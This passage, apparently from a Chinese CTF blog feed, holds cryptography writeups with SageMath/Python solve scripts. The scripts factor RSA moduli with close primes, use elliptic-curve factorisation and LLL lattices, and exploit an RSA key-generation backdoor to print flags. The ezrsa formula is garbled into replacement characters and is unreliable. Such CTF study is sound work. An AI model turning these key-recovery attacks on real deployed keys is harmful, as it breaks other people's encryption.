<span class=\"token comment\">#归一</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>res <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>small_roots<span class=\"token punctuation\">(</span>x<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token operator\">^</span>kbits<span class=\"token punctuation\">,</span>epslon<span class=\"token operator\">=</span><span class=\"token number\">0.04</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>xx <span class=\"token operator\">=</span> res<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>m3 <span class=\"token operator\">=</span> M <span class=\"token operator\">+</span> r<span class=\"token operator\">*</span>xx</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>m3 <span class=\"token operator\">=</span> long_to_bytes<span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>m3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">32</span><span class=\"token punctuation\">]</span></pre></td></tr></table></figure><p>把三段 part 拼起来，再 base64 解密即可。</p>\n<h2 id=\"next-prime\"><a class=\"markdownIt-Anchor\" href=\"#next-prime\">#</a> next-prime</h2>\n<p>只给了 n 的高 504 位，但由于 p 和 q 非常接近，并且 n 的低位对开方影响很小，所以将 n 左移 520 位再开方可以得到 p 和 q 之间的一个数，那么再减去一个小的值，它的下一个素数多半就是 p。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> gmpy2</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> sympy<span class=\"token punctuation\">.</span>ntheory <span class=\"token keyword\">import</span> prevprime<span class=\"token punctuation\">,</span>nextprime</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>n<span class=\"token operator\">=</span> <span class=\"token number\">28576274811010794362153160897556935178530640825011441539841241257190782139295561904323347128956873569754645071205043238985141474388531008367238218822591</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>c<span class=\"token operator\">=</span> <span class=\"token number\">49502875285578675438052554215266678403659290915102322948363030271494959804587081871467110614683972929037615883922743651431683465100061968204901334627149795829429950385848753728500177164800064208215503246868631076011505268371936586645321659884527055007299822625570713613996139223348709621258028349513737798120</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>n <span class=\"token operator\">=</span> n <span class=\"token operator\">*</span> <span class=\"token number\">2</span> <span class=\"token operator\">**</span> <span class=\"token number\">520</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>base <span class=\"token operator\">=</span> gmpy2<span class=\"token punctuation\">.</span>iroot<span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    base <span class=\"token operator\">=</span> prevprime<span class=\"token punctuation\">(</span>base<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    q <span class=\"token operator\">=</span> nextprime<span class=\"token punctuation\">(</span>base<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    n <span class=\"token operator\">=</span> base<span class=\"token operator\">*</span>q</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    phi <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>base<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    d <span class=\"token operator\">=</span> inverse<span class=\"token punctuation\">(</span><span class=\"token number\">65537</span><span class=\"token punctuation\">,</span>phi<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    m <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span>d<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    r <span class=\"token operator\">=</span> long_to_bytes<span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token string\">b'flag'</span> <span class=\"token keyword\">in</span> r<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">break</span></pre></td></tr></table></figure><h2 id=\"ec_party-i\"><a class=\"markdownIt-Anchor\" href=\"#ec_party-i\">#</a> EC_Party-I</h2>\n<p>对 n 的分解可以用类似于 Elliptic Curve Factorization Method 的思路，<span class=\"exturl\" data-url=\"aHR0cDovL21hdGhtdS5naXRodWIuaW8vTVRDQVMvZG9jL0ludGVnZXJGYWN0b3JpemF0aW9uLmh0bWw=\">整数因子分解 - maTHμ - 计算机代数系统 (mathmu.github.io)</span>。具体来说可以参考 hitcon2022 的 Chimera 这题，将 order 的一个小因子除掉再乘以 E©，可能会产生 kp mod n 的情况，这会让 sagemath 报错，我们得以看到 kp 的值：</p>\n<p><img data-src=\"https://img2023.cnblogs.com/blog/2902310/202309/2902310-20230928102838986-294135316.png\" alt=\"image\"><br>\n 后边就是 ecrsa 的求解，2 与 Fq 的 order oq 互素，因此可以求出 Fq 下的 m，但 2 与 Fp 的 order op 不互素，可以通过解方程得到 Fp 下的 m，最后 crt 即可。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">,</span>C <span class=\"token operator\">=</span> <span class=\"token number\">138681122158674534796479818810828100269024674330030901179877002756402543027343312824423418859769980312713625658733</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4989541340743108588577899263469059346332852532421276369038720203527706762720292559751463880310075002363945271507040</span><span class=\"token punctuation\">,</span> <span class=\"token number\">762981334990685089884160169295988791471426441106522959345412318178660817286272606245181160960267776171409174142433857335352402619564485470678152764621235882232914864951345067231483720755544188962798600739631026707678945887174897543</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token number\">19591102741441427006422487362547101973286873135330241799412389205281057650306427438686318050682578531286702107543065985988634367524715153650482199099194389191525898366546842016339136884277515665890331906261550080128989942048438965</span><span class=\"token punctuation\">,</span> <span class=\"token number\">728465071542637655949094554469510039681717865811604984652385614821789556549826602178972137405550902004858456181137844771163710123158955524137202319902378503104952106036911634918189377295743976966073577013775200078470659428344462772</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>E <span class=\"token operator\">=</span> EllipticCurve<span class=\"token punctuation\">(</span>Zmod<span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">[</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>C <span class=\"token operator\">=</span> E<span class=\"token punctuation\">(</span>C<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>order <span class=\"token operator\">=</span> <span class=\"token number\">762981334990685089884160169295988791471426441106522959345445792076415993922016249232021560266153453470937452118572318136597282436269660557904217923887981072203978473274822142705255987334355747997513083011853917049784914749699536828</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">#fac</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>o <span class=\"token operator\">=</span> order <span class=\"token operator\">//</span> <span class=\"token number\">8452217</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">#print(C*o)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\"># for i in range(1,10000):</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\">#     tt = (order//i)*C</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>p <span class=\"token operator\">=</span> <span class=\"token number\">37474009785980474658135106783131904659818035950984079581009709986840194575036321428945132957079423328996508289872067</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>q <span class=\"token operator\">=</span> n<span class=\"token operator\">//</span>p</pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">assert</span> p<span class=\"token operator\">*</span>q <span class=\"token operator\">==</span> n</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>Ep <span class=\"token operator\">=</span> EllipticCurve<span class=\"token punctuation\">(</span>Zmod<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">[</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>Eq <span class=\"token operator\">=</span> EllipticCurve<span class=\"token punctuation\">(</span>Zmod<span class=\"token punctuation\">(</span>q<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">[</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\">#print(Ep.order())</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\">#print(Eq.order())</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>op <span class=\"token operator\">=</span> <span class=\"token number\">37474009785980474658135106783131904659818035950984079581012533947688268013671227793391417023914911897089093262951596</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>oq <span class=\"token operator\">=</span> order <span class=\"token operator\">//</span> op</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>dq <span class=\"token operator\">=</span> inverse_mod<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>oq<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>mq <span class=\"token operator\">=</span> dq<span class=\"token operator\">*</span>Eq<span class=\"token punctuation\">(</span>C<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>Ep<span class=\"token punctuation\">(</span>C<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>R<span class=\"token punctuation\">.</span><span class=\"token operator\">&lt;</span>x<span class=\"token operator\">></span> <span class=\"token operator\">=</span> PolynomialRing<span class=\"token punctuation\">(</span>GF<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>f <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token operator\">*</span>x<span class=\"token operator\">^</span><span class=\"token number\">2</span><span class=\"token operator\">+</span>a<span class=\"token punctuation\">)</span><span class=\"token operator\">^</span><span class=\"token number\">2</span><span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token operator\">*</span>x<span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>x<span class=\"token operator\">^</span><span class=\"token number\">3</span><span class=\"token operator\">+</span>a<span class=\"token operator\">*</span>x<span class=\"token operator\">+</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span>C<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span><span class=\"token number\">4</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>x<span class=\"token operator\">^</span><span class=\"token number\">3</span><span class=\"token operator\">+</span>a<span class=\"token operator\">*</span>x<span class=\"token operator\">+</span>b<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">.</span>roots<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span>crt<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>mq<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">[</span>p<span class=\"token punctuation\">,</span>q<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'done'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>分类: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vWmltYUJsdWUvY2F0ZWdvcnkvMjIwMjk5Ny5odG1s\">WriteUp</span></p>\n<p>标签: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vWmltYUJsdWUvdGFnL2NyeXB0by8=\">crypto</span> , <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vWmltYUJsdWUvdGFnL21pc2Mv\">misc</span> , <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vWmltYUJsdWUvdGFnL3dyaXRldXAv\">writeup</span></p>\n",
            "tags": []
        },
        {
            "id": "http://waltcsz.github.io/2023/12/",
            "url": "http://waltcsz.github.io/2023/12/",
            "title": "",
            "date_published": "2023-12-05T15:24:34.784Z",
            "content_html": "<h1 id=\"第七届蓝帽杯全国大学生网络安全技能大赛\"><a class=\"markdownIt-Anchor\" href=\"#第七届蓝帽杯全国大学生网络安全技能大赛\">#</a> <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vWmltYUJsdWUvYXJ0aWNsZXMvMTc3MzkzNjYuaHRtbA==\"> 第七届蓝帽杯全国大学生网络安全技能大赛 </span></h1>\n<p>我只是赛后看看题而已 ^^</p>\n<h2 id=\"初赛-dhrsa\"><a class=\"markdownIt-Anchor\" href=\"#初赛-dhrsa\">#</a> 初赛 - DHRSA</h2>\n<p>第一部分利用 n1ctf2022 的背包格和 ph 算法求参数，第二部分参考论文里的 backdoor 进行分解。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>s<span class=\"token operator\">=</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>s<span class=\"token operator\">=</span><span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span><span class=\"token string\">'['</span><span class=\"token operator\">+</span>s<span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">'[+] Try '</span><span class=\"token punctuation\">,</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">'\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">','</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">']'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>M<span class=\"token operator\">=</span>Matrix<span class=\"token punctuation\">(</span>ZZ<span class=\"token punctuation\">,</span><span class=\"token number\">62</span><span class=\"token punctuation\">,</span><span class=\"token number\">63</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>cc<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span>s<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">62</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>C<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span>s<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">62</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">62</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    M<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>cc<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;&lt;</span><span class=\"token number\">40</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    M<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">,</span>i<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>res<span class=\"token operator\">=</span>M<span class=\"token punctuation\">.</span>LLL<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>r1<span class=\"token operator\">=</span>res<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>r2<span class=\"token operator\">=</span>res<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>xx <span class=\"token operator\">=</span> product<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>ZZ<span class=\"token punctuation\">(</span>y<span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> x <span class=\"token keyword\">for</span> x<span class=\"token punctuation\">,</span> y <span class=\"token keyword\">in</span> <span class=\"token builtin\">zip</span><span class=\"token punctuation\">(</span>r1<span class=\"token punctuation\">,</span> C<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>yy <span class=\"token operator\">=</span> product<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>ZZ<span class=\"token punctuation\">(</span>y<span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> x <span class=\"token keyword\">for</span> x<span class=\"token punctuation\">,</span> y <span class=\"token keyword\">in</span> <span class=\"token builtin\">zip</span><span class=\"token punctuation\">(</span>r2<span class=\"token punctuation\">,</span> C<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>r <span class=\"token operator\">=</span> gcd<span class=\"token punctuation\">(</span>xx<span class=\"token punctuation\">.</span>numer<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> xx<span class=\"token punctuation\">.</span>denom<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> yy<span class=\"token punctuation\">.</span>numer<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> yy<span class=\"token punctuation\">.</span>denom<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>X<span class=\"token operator\">=</span><span class=\"token number\">197551296081022143608034360606381334253374533627365455002683616928330857539205836504075700389569213696043700490195977045586318090211726350917451410932216</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>W<span class=\"token operator\">=</span><span class=\"token number\">10625560347436147537644301075885059900758953251551866239435327407977591190018531918316486861730777808988185029637608372445416280896280058313924537678128258</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>x <span class=\"token operator\">=</span> <span class=\"token number\">10661668070998584360419309727765572397096868781636098095295487404295848193280503932533547717105939587559768619286290065762620186259047850096911244235337628</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>w <span class=\"token operator\">=</span> <span class=\"token number\">4906271112282365731782355718975954883681410512144653038967637004076216581811845789271674832502423740658483643339407781551392926100321199924692149941796591</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token number\">61040814411609979711931510878805548760848686739454567580358315369154260598969544907138563610735920809370306294050956464828615417082277087799410050319871691154003766481799397897519555113273982347768485719165972634089532894585256662433949694618032747408071953491187718726218120284389638124624152241321006634774</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>n <span class=\"token operator\">=</span> <span class=\"token number\">66022752859576751705544115674843820574619778139841743306742674741819040147745776264697779394213058328572691946505564202779552568613562176486470653760142864852745249430164256770469301179840812051842363261404790355057115296671805975126795017665392798621718740402876024901551851638786170466127104615340863081593</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token comment\"># discrete_log(G(n%r),G(g))</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>r<span class=\"token operator\">=</span><span class=\"token number\">10667924450645948100608927157603781268991945924055943816082403476371801785989561454936076097627912279097114498936308342036099904242687703932444772733243819</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>G<span class=\"token operator\">=</span>GF<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>g<span class=\"token operator\">=</span><span class=\"token number\">6019887080267290264230260653584196278384320835640816590398803560025633855808434001764263669714920086295176455397726166743099512294951861972283858355052731</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">assert</span> ZZ<span class=\"token punctuation\">(</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>g<span class=\"token punctuation\">,</span>w<span class=\"token punctuation\">,</span>r<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">==</span>W</pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token keyword\">assert</span> ZZ<span class=\"token punctuation\">(</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>g<span class=\"token punctuation\">,</span>x<span class=\"token punctuation\">,</span>r<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">==</span>X</pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token comment\"># extension://bfdogplmndidlpjfhoijckpakkdjkkil/pdf/viewer.html?file=http%3A%2F%2Fmyweb.scu.edu.tw%2F~mn%2Fpaper%2FA%2520Comprehensive%2520Study%2520of%2520Backdoors%2520for%2520RSA%2520Key%2520Generation.pdf</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>p <span class=\"token operator\">=</span> ZZ<span class=\"token punctuation\">(</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>n <span class=\"token operator\">*</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>g<span class=\"token punctuation\">,</span>w<span class=\"token punctuation\">,</span>r<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span>x<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>r<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>q<span class=\"token operator\">=</span>n<span class=\"token operator\">//</span>p</pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>q<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">*</span>q<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">*</span>q <span class=\"token operator\">==</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>d<span class=\"token operator\">=</span>inverse<span class=\"token punctuation\">(</span><span class=\"token number\">65537</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>long_to_bytes<span class=\"token punctuation\">(</span>ZZ<span class=\"token punctuation\">(</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span>d<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token comment\"># b'god, you hack my backdoor!!! flag&#123;a_trivial_r5a_bbbbbbackd00r_***712***_c3nt5&#125;'</span></pre></td></tr></table></figure><h2 id=\"半决赛-ezrsa\"><a class=\"markdownIt-Anchor\" href=\"#半决赛-ezrsa\">#</a> 半决赛 - ezrsa</h2>\n<p>根据给的分数结合 <code>n=pq</code>  可以化简得到：�−�+1�+�=−�−2��+�<br>\n因此有�−�+1=�(−�−2�)，k 为 1 即可。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>x <span class=\"token operator\">=</span> <span class=\"token number\">153801856029563198525204130558738800846256680799373350925981555360388985602786501362501554433635610131437376183630577217917787342621398264625389914280509</span></pre></td></tr><tr><td 